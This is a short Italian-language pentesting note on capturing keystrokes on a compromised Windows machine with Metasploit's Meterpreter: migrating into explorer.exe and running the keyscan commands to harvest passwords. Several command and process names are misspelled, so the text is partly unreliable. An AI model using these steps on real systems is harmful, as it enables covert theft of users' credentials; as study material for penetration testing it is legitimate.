
# Keylogging su Windows
Il Keylogging é un processo eseguito da un apposito software e viene utilizzato dalle agenzie di inteligence per catturare la sequenza di tasti premuti da un target. <br>
É un processo molto importante per identificare password o credenziali in delle sequenze di tasti premuti da un utente che usa un sistema target. <br>
Esiste un modulo in metasploit in grado di replicare questo comportamento su un target di cui abbiammo ottenuto accesso. <br>
Dopo aver ottenuto una sessione meterpeter su un target, dobbiamo migrare verso il processo `exprorer.exe`:
```bash
pgrep exprorer.exe
migrate <PID>
```
esistono dei comandi per poter eseguire il meylogging dentro meterpreter:
```bash
keyscan_start      # fa partire la scansione dei tasti premuti sul target
keyscan_dumping    # mostra i tasti premuti fino a quel momento
keyscan_stop       # ferma il keylogging 
```

---
